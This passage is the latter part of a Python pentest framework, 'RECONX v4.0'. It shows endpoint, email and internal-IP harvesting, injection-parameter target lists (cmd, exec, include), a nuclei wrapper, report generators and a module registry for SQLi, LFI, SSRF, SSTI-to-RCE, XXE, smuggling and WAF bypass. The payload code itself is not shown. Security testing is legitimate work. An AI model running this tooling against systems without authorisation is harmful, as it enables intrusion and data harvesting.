    section("PHASE 12 — LinkPiece: Endpoint & Param Harvesting")
    harvest = {
        "endpoints":set(),"js_files":set(),"forms":[],"params":set(),
        "emails":set(),"internal_ips":set(),"api_endpoints":set(),
        "interesting_params":set(),"subdomains_from_links":set(),
    }
    for host,result in list(http_results.items())[:20]:
        if not isinstance(result,dict) or "raw_httpx" in result: continue
        scheme = result.get("scheme","https")
        base = f"{scheme}://{host}"
        try:
            r = requests.get(base,timeout=8,verify=False,headers={"User-Agent":ua()})
            body = r.text
            for lnk in re.findall(r'(?:href|src|action)=["\']([^"\'#]{3,})["\']',body,re.I):
                full = lnk if lnk.startswith("http") else urljoin(base,lnk)
                parsed = urlparse(full)
                if domain in (parsed.netloc or "") or not parsed.netloc:
                    harvest["endpoints"].add(full)
                    if parsed.query:
                        for param in parsed.query.split("&"):
                            k = param.split("=")[0]
                            harvest["params"].add(k)
                            if k.lower() in INTERESTING_PARAMS:
                                harvest["interesting_params"].add(f"{full} [{k}]")
                if parsed.netloc and domain in parsed.netloc and parsed.netloc != host:
                    harvest["subdomains_from_links"].add(parsed.netloc)
            for j in re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']',body,re.I):
                harvest["js_files"].add(j if j.startswith("http") else urljoin(base,j))
            for ap in re.findall(r'["\']/(api|v\d+|rest|graphql)[^\s"\']{0,80}["\']',body,re.I):
                harvest["api_endpoints"].add(urljoin(base,str(ap)))
            harvest["emails"].update(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',body))
            for ip in re.findall(r'(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d+\.\d+',body):
                harvest["internal_ips"].add(ip)
                log("vuln",f"Internal IP leaked: {ip} on {host}")
                add_finding("internal_ip_leak","medium",host=host,detail=f"Internal IP {ip} in response")
            for form in re.findall(r'<form[^>]*>(.*?)</form>',body,re.I|re.S)[:5]:
                action = re.search(r'action=["\']([^"\']+)["\']',form,re.I)
                method = re.search(r'method=["\']([^"\']+)["\']',form,re.I)
                inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']',form,re.I)
                harvest["forms"].append({"host":host,"action":action.group(1) if action else "/",
                                          "method":method.group(1).upper() if method else "GET","params":inputs})
        except: pass
    for url in wayback_urls:
        harvest["endpoints"].add(url)
        parsed = urlparse(url)
        if parsed.query:
            for param in parsed.query.split("&"):
                k = param.split("=")[0]
                harvest["params"].add(k)
                if k.lower() in INTERESTING_PARAMS: harvest["interesting_params"].add(f"{url} [{k}]")
    for k in ["endpoints","js_files","params","emails","internal_ips","api_endpoints","interesting_params","subdomains_from_links"]:
        harvest[k] = sorted(harvest[k])
    log("success",
        f"Endpoints:{BD}{len(harvest['endpoints'])}{RS}  JS:{BD}{len(harvest['js_files'])}{RS}  "
        f"Params:{BD}{len(harvest['params'])}{RS}  Emails:{BD}{len(harvest['emails'])}{RS}  "
        f"APIs:{BD}{len(harvest['api_endpoints'])}{RS}")
    if harvest["interesting_params"]:
        log("warn",f"{len(harvest['interesting_params'])} interesting params found:")
        for ep in list(harvest["interesting_params"])[:8]: log("link",ep)
    return harvest

def collect_targets(http_results, subdomains):
    targets = []
    common = ["id","page","cat","search","q","file","path","url","redirect","next","return",
              "lang","view","action","type","user","name","email","token","key","data",
              "input","field","order","filter","category","product","article","include",
              "require","load","template","cmd","exec","host","ip"]
    for host,result in http_results.items():
        if not isinstance(result,dict) or "raw_httpx" in result: continue
        scheme = result.get("scheme","https")
        base = f"{scheme}://{host}"
        for param in common[:15]+result.get("input_params",[])[:10]:
            targets.append({"url":f"{base}/?{param}=TEST","host":host,"param":param,"scheme":scheme})
    return targets[:120]

# ═══════════════════════════════════════════════════════════════════
# MODULE 13 — NUCLEI
# ═══════════════════════════════════════════════════════════════════
def run_nuclei(http_results, severity="medium,high,critical"):
    section("PHASE 13 — Nuclei Template Scanning")
    if not tool_ok("nuclei"):
        log("warn","nuclei not installed.")
        log("info","Install: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")
        log("info","Then:    nuclei -update-templates")
        return
    hosts = [f"{r.get('scheme','https')}://{h}" for h,r in http_results.items()
             if isinstance(r,dict) and "raw_httpx" not in r][:20]
    if not hosts: return
    tmp = "/tmp/reconx_nuclei.txt"
    with open(tmp,"w") as f: f.write("\n".join(hosts))
    log("info",f"nuclei on {len(hosts)} hosts (severity: {severity})...")
    out,_,rc = run_cmd(f"nuclei -l {tmp} -severity {severity} -silent -timeout 5 2>/dev/null",300)
    if rc == 0 and out:
        for line in out.splitlines():
            log("vuln",f"Nuclei: {line}")
            sev = "critical" if "critical" in line.lower() else "high" if "high" in line.lower() else "medium"
            add_finding("nuclei",sev,host="nuclei",detail=line[:200])
    else:
        log("info","Nuclei: no findings (or run: nuclei -update-templates)")

# ═══════════════════════════════════════════════════════════════════
# MODULE 14 — HTML REPORT
# ═══════════════════════════════════════════════════════════════════
def generate_html_report(domain, data, ts):
    subs = data.get("subdomains",{})
    http_r = data.get("http_results",{})
    ports = data.get("port_results",{})
    all_f = sorted(FINDINGS,key=lambda x:SORD.get(x.get("severity","unknown"),5))
    crit = [f for f in all_f if f.get("severity") in ("critical","high")]
    med  = [f for f in all_f if f.get("severity") == "medium"]
    lp   = data.get("linkpiece",{})

    def badge(s):
        c = {"critical":"#e74c3c","high":"#e67e22","medium":"#f39c12","low":"#27ae60","info":"#3498db"}.get(s,"#95a5a6")
        return f'<span style="background:{c};color:#fff;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:bold">{s.upper()}</span>'

    rows = ""
    for f in all_f[:200]:
        rows += f"""<tr>
            <td>{badge(f.get("severity","info"))}</td>
            <td><code style="font-size:11px">{f.get("type","")}</code></td>
            <td style="word-break:break-all;font-size:12px">{f.get("host","")}</td>
            <td style="max-width:380px;word-break:break-all;font-size:12px">{str(f.get("detail",""))[:150]}</td>
            <td><code style="font-size:11px;color:#e94560">{f.get("cve_id","")}</code></td>
        </tr>"""

    sub_rows = "".join(
        f'<tr><td style="color:{"#27ae60" if ip!="unresolved" else "#e74c3c"}">{sub}</td><td>{ip}</td></tr>'
        for sub,ip in sorted(subs.items())[:80])

    port_rows = "".join(
        f'<tr><td>{ip}</td><td style="color:{"#e74c3c" if p.get("risk") else "#27ae60"}">{p["port_proto"]}</td><td>{p["service"]}</td><td>{p["version"][:40]}</td><td style="color:#e74c3c;font-size:11px">{p.get("risk","")[:60]}</td></tr>'
        for ip,d in ports.items() for p in d.get("ports",[]))

    kev_count = len([f for f in FINDINGS if f.get("type")=="cisa_kev"])
    ssrf_count = len([f for f in FINDINGS if "ssrf" in f.get("type","")])
    ssti_count = len([f for f in FINDINGS if "ssti" in f.get("type","")])

    return f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<title>RECONX v4.0 — {domain}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0a0a14;color:#e0e0e0}}
.header{{background:linear-gradient(135deg,#0d0d1a,#12122a,#0f2040);padding:40px;border-bottom:3px solid #e94560;text-align:center}}
.header h1{{font-size:2.2em;color:#e94560;letter-spacing:3px;font-family:monospace}}
.header .author{{color:#00ff88;font-size:1em;margin-top:8px;letter-spacing:2px}}
.header .meta{{color:#666;font-size:13px;margin-top:6px}}
.container{{max-width:1500px;margin:0 auto;padding:28px}}
.stats{{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:12px;margin:24px 0}}
.sc{{background:#12122a;border:1px solid #1e1e40;border-radius:10px;padding:16px;text-align:center;transition:border-color .2s}}
.sc:hover{{border-color:#e94560}}
.sc .num{{font-size:2em;font-weight:bold;color:#e94560}}
.sc .num.g{{color:#27ae60}}.sc .num.y{{color:#f39c12}}
.sc .lbl{{color:#555;font-size:11px;margin-top:4px;letter-spacing:1px;text-transform:uppercase}}
.section{{background:#12122a;border:1px solid #1e1e40;border-radius:10px;padding:22px;margin:18px 0}}
.section h2{{color:#e94560;border-bottom:1px solid #1e1e40;padding-bottom:10px;margin-bottom:14px;font-size:1.1em;letter-spacing:2px;font-family:monospace}}
table{{width:100%;border-collapse:collapse;font-size:12px}}
th{{background:#080814;color:#777;padding:9px;text-align:left;border-bottom:1px solid #1e1e40;letter-spacing:1px;font-size:11px;text-transform:uppercase}}
td{{padding:8px 10px;border-bottom:1px solid #121230;vertical-align:top}}
tr:hover td{{background:#161630}}
code{{background:#080814;padding:2px 6px;border-radius:3px;font-family:monospace;color:#00ff88;font-size:11px}}
.tag{{display:inline-block;padding:1px 7px;border-radius:3px;font-size:10px;margin:2px;background:#1e1e40;color:#aaa}}
.footer{{text-align:center;padding:24px;color:#333;font-size:12px;border-top:1px solid #1e1e40;margin-top:20px}}
</style></head>
<body>
<div class="header">
  <h1>⚡ RECONX v4.0</h1>
  <div class="author">Created by Amith Krishna MK</div>
  <div class="meta">Target: <strong style="color:#00ff88">{domain}</strong> &nbsp;|&nbsp; {ts} &nbsp;|&nbsp; Professional Penetration Testing Framework — Tier 1-4</div>
</div>
<div class="container">
<div class="stats">
  <div class="sc"><div class="num">{len(subs)}</div><div class="lbl">Subdomains</div></div>
  <div class="sc"><div class="num g">{len([v for v in subs.values() if v!="unresolved"])}</div><div class="lbl">Live Hosts</div></div>
  <div class="sc"><div class="num">{len(http_r) if isinstance(http_r,dict) else 0}</div><div class="lbl">Web Services</div></div>
  <div class="sc"><div class="num">{len(ports)}</div><div class="lbl">IPs Scanned</div></div>
  <div class="sc"><div class="num y">{len(crit)}</div><div class="lbl">High/Critical</div></div>
  <div class="sc"><div class="num y">{len(med)}</div><div class="lbl">Medium</div></div>
  <div class="sc"><div class="num g">{kev_count}</div><div class="lbl">CISA KEV</div></div>
  <div class="sc"><div class="num">{len(lp.get("endpoints",[]))}</div><div class="lbl">Endpoints</div></div>
  <div class="sc"><div class="num">{len(lp.get("js_files",[]))}</div><div class="lbl">JS Files</div></div>
  <div class="sc"><div class="num">{len(lp.get("emails",[]))}</div><div class="lbl">Emails</div></div>
  <div class="sc"><div class="num y">{ssrf_count}</div><div class="lbl">SSRF</div></div>
  <div class="sc"><div class="num y">{ssti_count}</div><div class="lbl">SSTI/RCE</div></div>
</div>

<div class="section">
  <h2>🚨 All Findings ({len(FINDINGS)} total — sorted by severity)</h2>
  <table><tr><th>Sev</th><th>Type</th><th>Host</th><th>Detail</th><th>CVE</th></tr>
  {rows or "<tr><td colspan=5 style='text-align:center;color:#333;padding:20px'>No findings recorded</td></tr>"}
  </table>
</div>

<div class="section">
  <h2>🌐 Subdomains ({len(subs)})</h2>
  <table><tr><th>Subdomain</th><th>IP</th></tr>{sub_rows}</table>
</div>

<div class="section">
  <h2>🔌 Open Ports</h2>
  <table><tr><th>IP</th><th>Port</th><th>Service</th><th>Version</th><th>Risk</th></tr>
  {port_rows or "<tr><td colspan=5 style='text-align:center;color:#333'>No ports scanned</td></tr>"}
  </table>
</div>

<div class="section">
  <h2>🔗 LinkPiece — Endpoint Intelligence</h2>
  <table>
    <tr><th>Category</th><th>Count</th><th>Sample</th></tr>
    <tr><td>Endpoints</td><td>{len(lp.get("endpoints",[]))}</td><td><code>{(lp.get("endpoints") or [""])[0][:80]}</code></td></tr>
    <tr><td>JS Files</td><td>{len(lp.get("js_files",[]))}</td><td><code>{(lp.get("js_files") or [""])[0][:80]}</code></td></tr>
    <tr><td>Parameters</td><td>{len(lp.get("params",[]))}</td><td>{"".join(f'<span class="tag">{p}</span>' for p in lp.get("params",[])[:15])}</td></tr>
    <tr><td>API Endpoints</td><td>{len(lp.get("api_endpoints",[]))}</td><td><code>{(lp.get("api_endpoints") or [""])[0][:80]}</code></td></tr>
    <tr><td>Emails Found</td><td>{len(lp.get("emails",[]))}</td><td>{", ".join(lp.get("emails",[])[:5])}</td></tr>
    <tr><td style="color:#e74c3c">Internal IPs Leaked</td><td style="color:#e74c3c">{len(lp.get("internal_ips",[]))}</td><td style="color:#e74c3c">{", ".join(lp.get("internal_ips",[])[:5])}</td></tr>
    <tr><td>Subdomains via Links</td><td>{len(lp.get("subdomains_from_links",[]))}</td><td>{", ".join(lp.get("subdomains_from_links",[])[:5])}</td></tr>
  </table>
</div>

</div>
<div class="footer">
  RECONX v4.0 — Professional Penetration Testing Framework &nbsp;|&nbsp;
  <strong style="color:#00ff88">Created by Amith Krishna MK</strong> &nbsp;|&nbsp;
  ⚠ Authorized Use Only
</div>
</body></html>"""

# ═══════════════════════════════════════════════════════════════════
# MODULE 15 — FULL REPORT
# ═══════════════════════════════════════════════════════════════════
def generate_report(domain, data, output_dir):
    section("PHASE 15 — Report Generation")
    ts  = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    dt  = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    out = Path(output_dir); out.mkdir(parents=True,exist_ok=True)
    all_f = sorted(FINDINGS,key=lambda x:SORD.get(x.get("severity","unknown"),5))
    subs  = data.get("subdomains",{})
    http_r = data.get("http_results",{})
    ports  = data.get("port_results",{})
    lp     = data.get("linkpiece",{})
    crit   = [f for f in all_f if f.get("severity") in ("critical","high")]
    kev    = [f for f in all_f if f.get("type") == "cisa_kev"]

    # JSON
    jp = out/f"reconx_{domain}_{ts}.json"
    export = {
        "meta":{"tool":"RECONX v4.0","author":"Amith Krishna MK","target":domain,"ts":ts},
        "findings":all_f,"subdomains":subs,"dns":data.get("dns_records",{}),
        "ports":{ip:{"hosts":d["hosts"],"ports":d["ports"]} for ip,d in ports.items()},
        "linkpiece":lp,"asn":data.get("asn",{}),"certs":data.get("certs",{})
    }
    with open(jp,"w") as f: json.dump(export,f,indent=2,default=str)

    # HTML
    hp = out/f"reconx_{domain}_{ts}.html"
    with open(hp,"w") as f: f.write(generate_html_report(domain,data,dt))

    # Markdown
    mp = out/f"reconx_{domain}_{ts}.md"
    with open(mp,"w") as f:
        f.write(f"# RECONX v4.0 — {domain}\n")
        f.write(f"**Author:** Amith Krishna MK  \n**Date:** {dt}  \n**Tool:** RECONX v4.0\n\n---\n\n")
        f.write("## Executive Summary\n\n| Metric | Count |\n|--------|-------|\n")
        f.write(f"| Subdomains | {len(subs)} |\n")
        f.write(f"| Live Web Services | {len(http_r) if isinstance(http_r,dict) else 0} |\n")
        f.write(f"| IPs Scanned | {len(ports)} |\n")
        f.write(f"| Total Findings | {len(all_f)} |\n")
        f.write(f"| Critical/High | {len(crit)} |\n")
        f.write(f"| CISA KEV | {len(kev)} |\n\n")
        f.write("## Findings (Sorted by Severity)\n\n| Severity | Type | Host | Detail | CVE |\n|----------|------|------|--------|-----|\n")
        for fi in all_f[:120]:
            f.write(f"| {fi.get('severity','?').upper()} | {fi.get('type','')} | {fi.get('host','')} | {str(fi.get('detail',''))[:100]} | {fi.get('cve_id','')} |\n")
        f.write(f"\n## Subdomains ({len(subs)})\n\n| Subdomain | IP |\n|-----------|----|\n")
        for sub,ip in sorted(subs.items()): f.write(f"| `{sub}` | `{ip}` |\n")
        f.write("\n## Google Dorks\n\n")
        for d in data.get("google_dorks",[]): f.write(f"- `{d}`\n")

    log("success",f"JSON → {BD}{jp}{RS}")
    log("success",f"HTML → {BD}{hp}{RS}")
    log("success",f"MD   → {BD}{mp}{RS}")
    return jp, hp, mp

# ═══════════════════════════════════════════════════════════════════
# MODULE REGISTRY
# ═══════════════════════════════════════════════════════════════════
MODULES = {
    "osint":        "OSINT — WHOIS, Shodan, Wayback, Emails, Google Dorks",
    "subdomains":   "Subdomain Enum — subfinder, crt.sh, async DNS brute (150 concurrent)",
    "dns":          "DNS Analysis — records, zone transfer, SPF/DMARC audit",
    "http":         "Async HTTP Probing — tech fingerprinting, 30+ frameworks",
    "cms":          "CMS Scanner — WordPress, Joomla, Drupal, wpscan integration",
    "paths":        "Sensitive Path Discovery — 120+ paths (.env, .git, actuator...)",
    "ports":        "Nmap Port Scanning — 5 profiles incl. stealth & vuln NSE",
    "cve":          "CVE/RCE Correlation + CISA KEV check (20 critical CVEs built-in)",
    "sqli":         "SQL Injection — error-based & time-based testing",
    "xss":          "Cross-Site Scripting — reflected XSS across all params",
    "lfi":          "Local File Inclusion — /etc/passwd confirmation",
    "cors":         "CORS Misconfiguration — credential leakage check",
    "ssrf":         "SSRF Detection — cloud metadata & internal endpoints",
    "ssti":         "SSTI Testing → RCE (Jinja2, Twig, Spring SpEL, ERB, Freemarker)",
    "xxe":          "XXE Injection — file read & SSRF via XML",
    "proto":        "Prototype Pollution — Node.js/Express apps",
    "smuggle":      "HTTP Request Smuggling — CL.TE/TE.CL probe",
    "redirect":     "Open Redirect — redirect param detection",
    "jsanalysis":   "JavaScript Deep Analysis — hidden APIs, secrets, S3 refs",
    "graphql":      "GraphQL — introspection, batch DoS, sensitive type detection",
    "s3":           "S3 & Cloud Storage — AWS S3 + Azure Blob enumeration",
    "asn":          "ASN & IP Range — organization IP space discovery",
    "certs":        "TLS Certificate Analysis — SANs, expiry, weak ciphers",
    "waf":          "WAF Detection & Bypass — 9 WAF vendors, bypass techniques",
    "favicon":      "Favicon Hash — Shodan pivot fingerprinting",
    "cloudmeta":    "Cloud Metadata Testing — AWS/GCP/Azure IMDS probing",
    "ipv6":         "IPv6 Scanning — often bypasses firewalls",
    "headers":      "Security Header Audit — cookies, CSP, HSTS, disclosure",
    "nuclei":       "Nuclei Template Scanning — 9000+ community templates",
    "linkpiece":    "LinkPiece — endpoint harvest, params, emails, APIs, IP leaks",
}

# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════
def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="RECONX v4.0 — Professional Penetration Testing Framework by Amith Krishna MK",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="\n".join([
            "\nSCAN MODES:",
            "  --full                Run ALL 30 modules (complete engagement)",
            "  --module MODULE       Run a single specific module",
            "\nAVAILABLE MODULES:",
        ] + [f"  {k:<16} {v}" for k,v in MODULES.items()] + [
            "\nEXAMPLES:",
            "  python3 reconx.py -d example.com --full",
            "  python3 reconx.py -d example.com --full --scan-type vuln",
            "  python3 reconx.py -d example.com --module osint",
            "  python3 reconx.py -d example.com --module sqli",
            "  python3 reconx.py -d example.com --module cms",
            "  python3 reconx.py -d example.com --module ssrf",
            "  python3 reconx.py -d example.com --module ssti",
            "  python3 reconx.py -d example.com --module graphql",
            "  python3 reconx.py -d example.com --module s3",
            "  python3 reconx.py -d example.com --module nuclei",
        ])
    )
    parser.add_argument("-d","--domain",        required=True, help="Target domain")
    parser.add_argument("--full",               action="store_true", help="Run all 30 modules")
    parser.add_argument("--module",             help="Run single module")
    parser.add_argument("--scan-type",          default="default",
                        choices=["stealth","quick","default","full","vuln"])
    parser.add_argument("--output",             default="./reconx_output")
    parser.add_argument("-w","--wordlist",      help="Custom subdomain wordlist")
    parser.add_argument("--shodan-key",         help="Shodan API key")
    parser.add_argument("--nuclei-severity",    default="medium,high,critical")
    args = parser.parse_args()

    if not args.full and not args.module:
        print(f"\n{R}  Error: specify --full or --module <name>{RS}")
        print(f"\n  Available modules: {', '.join(MODULES.keys())}")
        print(f"\n  Examples:")
        print(f"    python3 reconx.py -d example.com --full")
        print(f"    python3 reconx.py -d example.com --module sqli")
        sys.exit(1)

    if args.module and args.module not in MODULES:
        print(f"\n{R}  Unknown module: {args.module}{RS}")
        print(f"  Available: {', '.join(MODULES.keys())}")
        sys.exit(1)

    domain = args.domain.strip().lower()
    for p in ["https://","http://","www."]:
        if domain.startswith(p): domain = domain[len(p):]
    domain = domain.rstrip("/")

    mode_str = f"FULL SCAN — all {len(MODULES)} modules" if args.full else f"SINGLE MODULE — {args.module}"
    log("info",  f"Target : {BD}{domain}{RS}")
    log("info",  f"Mode   : {BD}{mode_str}{RS}")
    log("info",  f"Profile: {args.scan_type} | Output: {args.output}")
    log("warn",  f"Ensure written authorization before testing {domain}")
    print()

    data = {}
    subdomains   = {domain: resolve_ip(domain) or "unresolved"}
    http_results = {}
    port_results = {}
    targets      = []
    dns_records  = {}
    wayback      = []

    def run(mod): return args.full or args.module == mod

    # ── OSINT ──────────────────────────────────────────────────────
    if run("osint"):
        section("PHASE 1 — OSINT & Passive Intelligence")
        whois = osint_whois(domain)
        for k,v in list(whois.items())[:5]: log("success",f"{k}: {', '.join(v[:2])}")
        shodan = osint_shodan(domain, args.shodan_key)
        wayback = osint_wayback(domain)
        if wayback: log("success",f"Wayback: {len(wayback)} URLs")
        emails = osint_emailharvest(domain)
        if emails: log("success",f"Emails: {', '.join(emails[:5])}")
        dorks = osint_google_dorks(domain)
        log("success",f"{len(dorks)} Google dorks generated")
        ip = resolve_ip(domain)
        if ip:
            info = osint_ipinfo(ip)
            if info: log("success",f"IP info: {info.get('org','')} {info.get('city','')} {info.get('country','')}")
        data.update({"osint":{"whois":whois,"shodan":shodan},
                     "wayback_urls":wayback,"google_dorks":dorks,"harvested_emails":emails})

    # ── SUBDOMAINS ─────────────────────────────────────────────────
    if run("subdomains"):
        wordlist = None
        if args.wordlist:
            try:
                with open(args.wordlist) as f: wordlist = [l.strip() for l in f if l.strip()]
                log("info",f"Wordlist: {len(wordlist)} words")
            except Exception as e: log("warn",f"Wordlist error: {e}")
        subdomains = enumerate_subdomains(domain, wordlist)
        data["subdomains"] = subdomains

    # ── DNS ────────────────────────────────────────────────────────
    if run("dns"):
        dns_records = dns_enum(domain)
        data["dns_records"] = dns_records

    # ── HTTP ───────────────────────────────────────────────────────
    if run("http"):
        http_results = asyncio.run(http_probe_all(subdomains))
        data["http_results"] = http_results
        targets = collect_targets(http_results, subdomains)

    # Rebuild for single-module vuln tests
    if args.module in ("sqli","xss","lfi","ssrf","ssti","xxe","proto","smuggle",
                        "redirect","cors","graphql","cms","paths","headers","waf",
                        "favicon","jsanalysis","cloudmeta","nuclei","linkpiece"):
        if not http_results:
            log("info","Quick HTTP probe for single-module scan...")
            http_results = asyncio.run(http_probe_all(subdomains))
            data["http_results"] = http_results
        if not targets: targets = collect_targets(http_results, subdomains)

    # ── CMS ────────────────────────────────────────────────────────
    if run("cms"): cms_scan_all(http_results)

    # ── PATHS ──────────────────────────────────────────────────────
    if run("paths"):
        pf = path_discovery(http_results)
        data["path_findings"] = pf

    # ── PORTS ──────────────────────────────────────────────────────
    if run("ports"):
        port_results = port_scan_all(subdomains, args.scan_type)
        data["port_results"] = port_results

    # ── CVE/RCE ────────────────────────────────────────────────────
    if run("cve"): cve_rce_scan(port_results, http_results)

    # ── ACTIVE VULNS ───────────────────────────────────────────────
    if run("sqli"):    test_sqli(targets)
    if run("xss"):     test_xss(targets)
    if run("lfi"):     test_lfi(targets)
    if run("cors"):    test_cors(http_results)
    if run("ssrf"):    test_ssrf(http_results, subdomains)
    if run("ssti"):    test_ssti(targets)
    if run("xxe"):     test_xxe(http_results)
    if run("proto"):   test_prototype_pollution(http_results)
    if run("smuggle"): test_http_smuggling(http_results)
    if run("redirect"):test_open_redirect(targets)

    # ── SMART RECON ────────────────────────────────────────────────
    if run("jsanalysis"):
        eps = js_deep_analysis(http_results)
        data["js_endpoints"] = eps

    if run("graphql"): test_graphql(http_results)

    if run("s3"):      s3_enum(domain)

    if run("asn"):
        asn = asn_discovery(domain)
        data["asn"] = asn

    if run("certs"):
        certs = cert_analysis(domain, subdomains)
        data["certs"] = certs

    if run("waf"):     detect_waf(http_results)
    if run("favicon"): favicon_hash(http_results)

    # ── CLOUD ──────────────────────────────────────────────────────
    if run("cloudmeta"): test_cloud_metadata(http_results)

    if run("ipv6"):
        ipv6 = ipv6_scan(dns_records, args.scan_type)
        data["ipv6"] = ipv6

    # ── HEADERS ────────────────────────────────────────────────────
    if run("headers"): audit_headers(http_results)

    # ── NUCLEI ─────────────────────────────────────────────────────
    if run("nuclei"): run_nuclei(http_results, args.nuclei_severity)

    # ── LINKPIECE ──────────────────────────────────────────────────
    if run("linkpiece"):
        lp = linkpiece(domain, http_results, data.get("wayback_urls",[]))
        data["linkpiece"] = lp
    else:
        data.setdefault("linkpiece",{})

    # ── REPORT ─────────────────────────────────────────────────────
    jp, hp, mp = generate_report(domain, data, args.output)

    # ── FINAL SUMMARY ──────────────────────────────────────────────
    all_f  = sorted(FINDINGS,key=lambda x:SORD.get(x.get("severity","unknown"),5))
    crit   = [f for f in all_f if f.get("severity") in ("critical","high")]
    kev    = [f for f in all_f if f.get("type") == "cisa_kev"]
    rce    = [f for f in all_f if f.get("type") in ("rce_fingerprint","ssti_rce","ssrf","lfi")]

    print(f"\n{C}{'═'*70}{RS}")
    print(f"  {G}{BD}✓ RECONX v4.0 — Scan Complete{RS}")
    print(f"  {G}  Created by Amith Krishna MK{RS}")
    print(f"  {'─'*66}")
    print(f"  Target   : {BD}{domain}{RS}")
    print(f"  Subs     : {BD}{len(subdomains)}{RS}  |  HTTP: {BD}{len(http_results) if isinstance(http_results,dict) else 0}{RS}  |  IPs: {BD}{len(port_results)}{RS}")
    print(f"  Findings : {BD}{len(all_f)}{RS} total  |  {R}{BD}Critical/High: {len(crit)}{RS}  |  {R}{BD}CISA KEV: {len(kev)}{RS}  |  {R}{BD}RCE: {len(rce)}{RS}")
    if crit:
        print(f"\n  {R}{BD}TOP CRITICAL FINDINGS:{RS}")
        for f in crit[:5]:
            print(f"    {R}⚠{RS}  [{f.get('severity','?').upper()}]  {f.get('type','')}  →  {f.get('host','')}  →  {str(f.get('detail',''))[:55]}")
    print(f"\n  Reports saved to: {BD}{args.output}/{RS}")
    print(f"    {BD}{mp.name}{RS}")
    print(f"    {BD}{hp.name}{RS}")
    print(f"    {BD}{jp.name}{RS}")
    print(f"{C}{'═'*70}{RS}\n")

if __name__ == "__main__":
    main()
